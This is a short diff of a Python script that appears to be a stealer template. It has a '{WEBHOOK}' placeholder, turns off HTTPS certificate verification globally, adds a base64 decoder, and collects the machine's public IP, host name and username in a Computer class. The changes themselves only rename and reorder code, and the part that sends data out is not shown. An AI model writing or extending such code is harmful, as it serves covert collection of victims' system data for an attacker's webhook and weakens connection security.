@@ -1,15 +1,17 @@
 import os
-from platform import node
+import ssl
+from platform import node as get_pc_name
 from sys import platform
 from getpass import getuser
 from re import findall
+from base64 import b64decode
 from json import loads, dumps
 from typing import Optional, List
 from urllib.request import Request, urlopen
-import ssl
-ssl._create_default_https_context = ssl._create_unverified_context
 
 WEBHOOK = "{WEBHOOK}"
+
+ssl._create_default_https_context = ssl._create_unverified_context
 
 
 def open_url(url: str,
@@ -38,7 +40,7 @@ class Computer():
     def __init__(self):
         api_resp: dict = open_url(self.IPIFY_API_URL)
         self.ip: Optional(str) = api_resp.get("ip") if api_resp else None
-        self.name: str = node().split(".")[0] if node().find('.') else node()
+        self.name: str = get_pc_name().split(".")[0] if get_pc_name().find('.') else get_pc_name()
         self.username: str = getuser()
 
     def check_os(self) -> str:
